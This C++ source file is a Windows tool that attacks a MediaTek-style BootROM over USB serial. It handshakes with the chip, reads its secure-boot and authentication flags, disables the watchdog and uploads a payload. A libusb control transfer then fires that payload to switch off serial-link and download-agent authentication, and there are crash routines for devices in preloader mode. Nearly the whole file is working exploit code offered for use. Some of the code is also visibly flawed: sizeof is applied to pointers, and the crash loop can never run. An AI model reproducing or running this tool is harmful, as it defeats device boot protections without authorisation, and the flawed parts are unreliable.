#include <iostream>
#include <sys/stat.h>
#include <intrin.h>
#include <Windows.h>
#include <fstream>

#include "serial/serial.h"
#include "DeviceIO.h"
#include "json5pp.hpp"
#include "lusb0_usb.h"

using namespace std;
using namespace serial;

void help() 
{
	fprintf(stderr, "usage: bypass -d <driver_dir> -p <payload_dir> -c <config_file>\n");
}

bool isWow64Process() 
{
	typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	BOOL isWow = FALSE;
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
	if (fnIsWow64Process != NULL) 
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &isWow))
			isWow = FALSE;
	}
	return isWow;
}

vector<Entry> read_config(const char *path) 
{
	ifstream is(path);
	auto x = json5pp::parse5(is);
	auto y = x.as_object();

	vector<Entry> entries;
	for (map<string, json5pp::value>::iterator it = y.begin(); it != y.end(); ++it) 
	{
		Entry entry;
		sscanf_s(it->first.c_str(), "%hx", &entry.hw_code);

		auto v = it->second.as_object();
		for (map<string, json5pp::value>::iterator jt = v.begin(); jt != v.end(); ++jt) 
		{
			if (jt->first == "watchdog_address")
				entry.wdg_addr = jt->second.as_number();
			else if (jt->first == "payload_address")
				entry.payload_addr = jt->second.as_number();
			else if (jt->first == "payload")
				entry.payload_name = jt->second.as_string();
			else if (jt->first == "var_0")
				entry.var0 = jt->second.as_number();
			else if (jt->first == "var_1")
				entry.var1 = jt->second.as_number();

		}
		entries.push_back(entry);
	}
	return entries;
}

int process_driver(string path, bool install) 
{
	fprintf(stdout, "Installing libusb driver...");

	if (isWow64Process())
		path += "\\driver64.exe";
	else
		path += "\\driver32.exe";

	bool success = false;
	Proc myProc(path);
	for (int i = 0; i < 5; i++) 
	{
		if (install)
			success = myProc.install_driver();
		else
			success = myProc.uninstall_driver();
		if (success)
			break;
	}

	if (success)
		return 0;

	return -1;
}
int handshake(SerialPort *p) 
{
	uint8_t res;
	if (!p->writeread8bit(0xa0, &res))
		return -1;
	if (res != 0x5f) 
	{
		fprintf(stderr, "Failed to handshake\n");
		return -1;
	}

	if (!p->writeread8bit(0xa, &res))
		return -1;
	if (res != 0xf5) 
	{
		fprintf(stderr, "Failed to handshake\n");
		return -1;
	}

	if (!p->writeread8bit(0x50, &res))
		return -1;
	if (res != 0xaf)
	{
		fprintf(stderr, "Failed to handshake\n");
		return -1;
	}

	if (!p->writeread8bit(0x5, &res))
		return -1;
	if (res != 0xfa)
	{
		fprintf(stderr, "Failed to handshake\n");
		return -1;
	}

	fprintf(stdout, "DONE\n");
	return 0;
}
int get_hw_code(SerialPort *p, uint16_t &hw_code) 
{
	uint16_t ret;
	if (!p->echo_data(0xfd, sizeof(uint8_t)))
		return -1;
	if (!p->read16bit(&hw_code))
		return -1;
	if (!p->read16bit(&ret))
		return -1;
	if (ret != 0) 
	{
		fprintf(stderr, "Unexcepted response: 0x%04X\n", ret);
		return -1;
	}
	hw_code = _byteswap_ushort(hw_code);
	return 0;
}
int get_hw_dict(SerialPort *p, uint16_t &hw_sub, uint16_t &hw_ver, uint16_t &sw_ver) 
{
	uint16_t ret;
	if (!p->echo_data(0xfc, sizeof(uint8_t)))
		return -1;

	if (!p->read16bit(&hw_sub))
		return -1;
	if (!p->read16bit(&hw_ver))
		return -1;
	if (!p->read16bit(&sw_ver))
		return -1;
	if (!p->read16bit(&ret))
		return -1;
	if (ret != 0) 
	{
		fprintf(stderr, "Unexcepted response: 0x%04X\n", ret);
		return -1;
	}

	hw_sub = _byteswap_ushort(hw_sub);
	hw_ver = _byteswap_ushort(hw_ver);
	sw_ver = _byteswap_ushort(sw_ver);

	return 0;
}
int get_target_config(SerialPort *p, bool &sec_boot, bool &sl_auth, bool &da_auth) 
{
	uint16_t ret;
	uint32_t config;

	if (!p->echo_data(0xd8, sizeof(uint8_t)))
		return -1;
	if (!p->read32bit(&config))
		return -1;
	if (!p->read16bit(&ret))
		return -1;
	if (ret != 0) 
	{
		fprintf(stderr, "Unexcepted response: 0x%04X\n", ret);
		return -1;
	}

	config = _byteswap_ulong(config);
	sec_boot = config & 1;
	sl_auth = config & 2;
	da_auth = config & 4;

	return 0;
}
int write32(SerialPort *p, uint32_t addr, vector<uint32_t>list, bool check) 
{
	uint16_t ret;

	if (!p->echo_data(0xd4, sizeof(uint8_t)))
		return -1;
	if (!p->echo_data(_byteswap_ulong(addr), sizeof(uint32_t)))
		return -1;
	if (!p->echo_data(_byteswap_ulong(list.size()), sizeof(uint32_t)))
		return -1;

	if (!p->read16bit(&ret))
		return -1;
	if (_byteswap_ushort(ret) != 1) 
	{
		fprintf(stderr, "Unexcepted response: 0x%04X", ret);
		return -1;
	}

	for (uint32_t numb : list) 
	{
		if (!p->echo_data(_byteswap_ulong(numb), sizeof(uint32_t)))
			return -1;
	}
	if (check) 
	{
		if (!p->read16bit(&ret))
			return -1;
		if (_byteswap_ushort(ret) != 1)
		{
			fprintf(stderr, "Unexcepted response: 0x%04X", ret);
			return -1;
		}
	}

	return 0;
}
int read32(SerialPort *p, char *data, uint32_t addr, int size) 
{
	if (!p->echo_data(0xd1, sizeof(uint8_t)))
		return -1;
	if (!p->echo_data(_byteswap_ulong(addr), sizeof(uint32_t)))
		return -1;
	if (!p->echo_data(_byteswap_ulong(size), sizeof(uint32_t)))
		return -1;

	uint16_t ret;
	if (!p->read16bit(&ret))
		return -1;
	if (ret != 0) 
	{
		fprintf(stderr, "Unexcepted response: 0x%04X", ret);
		return -1;
	}

	int collect = 0;
	for (int i = 0; i < size; i++) 
	{
		int len = p->read_data(data + collect, sizeof(uint32_t));
		if (len <= 0)
			break;
		collect += len;
	}

	if (!p->read16bit(&ret))
		return -1;
	if (ret != 0)
	{
		fprintf(stderr, "Unexcepted response: 0x%04X", ret);
		return -1;
	}
	return 0;
}
int send_da(SerialPort *p, char *data, uint32_t addr, uint32_t dalen, uint32_t siglen, uint16_t &chksum) 
{
	uint16_t ret;
	chksum = 0;

	if (!p->echo_data(0xd7, sizeof(uint8_t)))
		return -1;
	if (!p->echo_data(_byteswap_ulong(addr), sizeof(uint32_t)))
		return -1;
	if (!p->echo_data(_byteswap_ulong(dalen), sizeof(uint32_t)))
		return -1;
	if (!p->echo_data(_byteswap_ulong(siglen), sizeof(uint32_t)))
		return -1;
	if (!p->read16bit(&ret))
		return -1;
	if (ret != 0) 
	{
		fprintf(stderr, "Unexcepted response: 0x%04X", ret);
		return -1;
	}

	if (!p->write_data(data, dalen))
		return -1;
	if (!p->read16bit(&chksum))
		return -1;
	if (!p->read16bit(&ret))
		return -1;
	if (ret != 0) 
	{
		fprintf(stderr, "Unexcepted response: 0x%04X", ret);
		return -1;
	}

	chksum = _byteswap_ushort(chksum);
	return 0;
}
int jump_da(SerialPort *p, uint32_t addr) 
{
	uint16_t ret;
	if (!p->echo_data(0xd5, sizeof(uint8_t)))
		return -1;
	if (!p->echo_data(_byteswap_ulong(addr), sizeof(uint32_t)))
		return -1;
	if (!p->read16bit(&ret))
		return -1;
	if (ret != 0)
	{
		fprintf(stderr, "Unexcepted response: 0x%04X", ret);
		return -1;
	}
	return 0;
}
int send_usb_ctrl_transfer(int config) 
{
	bool found = false;
	struct usb_bus *bus;
	struct usb_device *dev;
	struct usb_dev_handle *handle = 0;

	usb_init();
	usb_find_busses();
	usb_find_devices();

	for (bus = usb_get_busses(); bus; bus = bus->next) 
	{
		for (dev = bus->devices; dev; dev = dev->next) 
		{
			if (dev->descriptor.idVendor == 0xe8d && dev->descriptor.idProduct == 3) 
			{
				found = true;
				handle = usb_open(dev);

				if (!handle) 
				{
					fprintf(stderr, "Libusb filter driver not detected.\n");
					return -1;
				}

				int ret = usb_control_msg(handle, 0xa1, 0, 0, config, NULL, 0, 0);
				if (ret != 0) 
				{
					usb_close(handle);
					fprintf(stderr, "%s.\n", usb_strerror());
					return -1;
				}

				usb_close(handle);
				break;
			}
		}
	}

	if (!found) 
	{
		fprintf(stderr, "Libusb filter driver not detected.\n");
		return -1;
	}
	return 0;
}

int main(int argc, char *argv[]) 
{
	if (argc < 5) 
	{
		help();
		return -1;
	}

	const char *payload = 0;
	const char *config = 0;
	const char *driver = 0;

	for (int i = 1; i < (argc - 1); i+=2) 
	{
		if (strncmp(argv[i], "-p", 2) == 0)
			payload = argv[i + 1];
		else if (strncmp(argv[i], "-c", 2) == 0)
			config = argv[i + 1];
		else if (strncmp(argv[i], "-d", 2) == 0)
			driver = argv[i + 1];
	}

	if (!payload) 
	{
		fprintf(stderr, "Payload dir is not defined.\n");
		help();
		return -1;
	}
	if (!config) 
	{
		fprintf(stderr, "Config file is not defined.\n");
		help();
		return -1;
	}

	struct stat dir;
	if (stat(payload, &dir) != 0 && !(dir.st_mode & S_IFDIR)) 
	{
		fprintf(stderr, "Payload dir not found.\n");
		help();
		return -1;
	}

	vector<Entry> entries = read_config(config);
	if (entries.empty()) 
	{
		fprintf(stderr, "Invalid configuration entry.\n");
		help();
		return -1;
	}

restart:
	int ret = 0;
	if (driver) 
	{
		string path(driver, strlen(driver));
		ret = process_driver(path, true);
		if (ret != 0)
			return ret;
	}

	Serial p;
	SerialPort io(&p);

	uint16_t vid = 0xe8d, pid = 3;
	fprintf(stdout, "Waiting for brom...");
	string port_name = io.listen_port(vid, pid);
	io.set_portname(port_name);

	uint16_t hw_code = 0, hw_sub = 0, hw_ver = 0, sw_ver = 0;
	bool sec_boot, sl_auth, da_auth;
	Entry entry; 

	fprintf(stdout, "Configuring port...");
	ret = io.open();
	if (ret != 0)
		return ret;

	fprintf(stdout, "Handshaking...");
	ret = handshake(&io);
	if (ret != 0)
		return ret;
	
	fprintf(stdout, "Retriving information...");
	ret = get_hw_code(&io, hw_code);
	if (ret != 0)
		return ret;

	ret = get_hw_dict(&io, hw_sub, hw_ver, sw_ver);
	if (ret != 0)
		return ret;

	ret = get_target_config(&io, sec_boot, sl_auth, da_auth);
	if (ret != 0)
		return -1;

	fprintf(stdout, "DONE\n");
	fprintf(stdout, "\n - Device hw code: 0x%04X", hw_code);
	fprintf(stdout, "\n - Device hw sub code: 0x%04X", hw_sub);
	fprintf(stdout, "\n - Device hw version: 0x%04X", hw_ver);
	fprintf(stdout, "\n - Device sw version: 0x%04X", sw_ver);
	fprintf(stdout, "\n - Device sl auth: %s", sl_auth ? "Yes" : "No");
	fprintf(stdout, "\n - Device da auth: %s", da_auth ? "Yes" : "No");

	fprintf(stdout, "\n\nReading configuration...");
	for (Entry e : entries) 
	{
		if (e.hw_code == hw_code) 
		{
			entry = e;
			break;
		}
	}
	if (entry.payload_name.empty()) 
	{
		fprintf(stderr, "Target configuration not found.\n");
		help();
		return -1;
	}
	fprintf(stdout, "DONE");

	while (pid != 3) 
	{
		fprintf(stdout, "Found device in preloader mode, trying to crash...");
		switch (entry.crash_method) 
		{
			case 0: 
			{
				char buff[0x118];
				memset(buff, 0, sizeof(buff));

				buff[0] = 0;
				buff[1] = 1;
				buff[2] = 0x9f;
				buff[3] = 0xe5;
				buff[4] = 0x10;
				buff[5] = 0xff;
				buff[6] = 0x2f;
				buff[7] = 0xe1;

				uint16_t chksum;
				ret = send_da(&io, buff, 0, sizeof(buff), 0, chksum);
				if (ret != 0)
					return ret;

				ret = jump_da(&io, 0);
				if (ret != 0)
					return ret;
			} break;
			case 1: 
			{
				char buff[100];
				memset(buff, 0, sizeof(buff));

				uint16_t chksum;
				ret = send_da(&io, buff, 0, sizeof(buff), 0x100, chksum);
				if (ret != 0)
					return ret;

				ret = jump_da(&io, 0);
				if (ret != 0)
					return ret;
			} break;
			case 2: 
			{
				char buff[4];
				ret = read32(&io, buff, 0, 1);
				if (ret != 0)
					return -1;
			} break;
		}
		p.close();
		fprintf(stdout, "DONE\n\n");
		goto restart;
	}

	fprintf(stdout, "\nDisabling watchdog timer...");
	vector<uint32_t> list;
	list.push_back(0x22000064);
	ret = write32(&io, entry.wdg_addr, list, true);
	if (ret != 0)
		return ret;
	fprintf(stdout, "DONE");
	
	char *data = 0;
	int len = 0, tmplen = 0;
	uint32_t check32;
	string payload_path(payload, strlen(payload));
	
	if (sl_auth || da_auth) 
	{
		fprintf(stdout, "\nDisabling protection...");
				
		string filename = payload_path + "\\" + entry.payload_name;

		ifstream is(filename.c_str(), ios::binary);
		is.seekg(0, is.end);
		len = is.tellg();
		is.seekg(0, is.beg);

		tmplen = len;
		while (len % 4)
			len++;

		if (len > 0xa00) 
		{
			fprintf(stderr, "Payload data too large.\n");
			return -1;
		}

		data = new char[len];
		memset(data, 0, len);
		is.read(data, tmplen);
		is.close();
		
		uint32_t wdg_addr = 0, uart_base = 0;
		int wdg_offset = tmplen - sizeof(uint32_t);
		int uart_offset = tmplen - (sizeof(uint32_t) * 2);

		memcpy(&wdg_addr, data + wdg_offset, sizeof(uint32_t));
		memcpy(&uart_base, data + uart_offset, sizeof(uint32_t));

		if (wdg_addr == 0x10007000)
			memcpy(data + wdg_offset, &entry.wdg_addr, sizeof(uint32_t));
		if (uart_base == 0x11002000)
			memcpy(data + uart_offset, &entry.uart_base, sizeof(uint32_t));

		uint32_t addr = entry.wdg_addr + 0x50;
		vector<uint32_t> vect_addr;
		vect_addr.push_back(_byteswap_ulong(entry.payload_addr));

		ret = write32(&io, addr, vect_addr, true);
		if (ret != 0)
			return ret;

		if (entry.var0 != -1) 
		{
			int l = entry.var0 + 4;
			char *buff = new char[l];
			memset(buff, 0, l);
			ret = read32(&io, buff, addr - entry.var0, l / sizeof(uint32_t));
			if (ret != 0) 
				return ret;
		}
		else 
		{
			int cnt = 15;
			int l = 0, collect = 0;
			for (int i = 0; i < 15; i++)
				l += (cnt - i + 1);
			l *= sizeof(uint32_t);

			char *buff = new char[l];
			memset(buff, 0, l);

			for (int i = 0; i < 15; i++) 
			{
				ret = read32(&io, buff + collect, addr - (cnt - i) * 4, cnt - i + 1);
				if (ret != 0)
					return ret;
				collect += ((cnt - i + 1) * sizeof(uint32_t));
			}
		}

		if (!io.echo_data(0xe0, sizeof(uint8_t)))
			return -1;
		if (!io.echo_data(_byteswap_ulong(len), sizeof(uint32_t)))
			return -1;

		uint16_t check16;
		if (!io.read16bit(&check16))
			return -1;

		bool ans = io.write_data(data, len);
		if (!ans)
			return -1;
		
		if (!io.read32bit(&check32))
			return -1;

		ret = send_usb_ctrl_transfer(entry.var1);
		if (ret != 0)
			return ret;
	}
	else 
	{
		fprintf(stdout, "\nAlready insecured boot.\n");
		fprintf(stdout, "\nSending payload using send_da...");

		entry.payload_name = "generic_dump_payload.bin";
		entry.payload_addr = 0x200d00;

		string filename = payload_path + "\\" + entry.payload_name;
		
		ifstream is(filename.c_str());
		is.seekg(0, is.end);
		len = is.tellg();
		is.seekg(0, is.beg);

		tmplen = len;
		while (len % 4)
			len++;

		if (len > 0xa00)
		{
			fprintf(stderr, "Payload data too large.\n");
			return -1;
		}

		data = new char[len];
		memset(data, 0, len);
		is.read(data, tmplen);
		is.close();

		uint32_t wdg_addr = 0, uart_base = 0;
		int wdg_offset = tmplen - sizeof(uint32_t);
		int uart_offset = tmplen - (sizeof(uint32_t) * 2);

		memcpy(&wdg_addr, data + wdg_offset, sizeof(uint32_t));
		memcpy(&uart_base, data + uart_offset, sizeof(uint32_t));

		if (wdg_addr == 0x10007000)
			memcpy(data + wdg_offset, &entry.wdg_addr, sizeof(uint32_t));
		if (uart_base == 0x11002000)
			memcpy(data + uart_offset, &entry.uart_base, sizeof(uint32_t));

		char *buff = new char[len + 0x100];
		memset(buff, 0, sizeof(buff));
		memcpy(buff, data, len);

		uint16_t chksum = 0;
		ret = send_da(&io, buff, entry.payload_addr, sizeof(buff), 0x100, chksum);
		if (ret != 0)
			return ret;

		ret = jump_da(&io, entry.payload_addr);
		if (ret != 0)
			return ret;
	}

	if (!io.read32bit(&check32))
		return -1;

	check32 = _byteswap_ulong(check32);
	if (check32 != 0xa1a2a3a4) 
	{
		fprintf(stderr, "Failed to disable protection.\n");
		return -1;
	}
	
	fprintf(stdout, "DONE\n");
	p.close();

	return 0;
}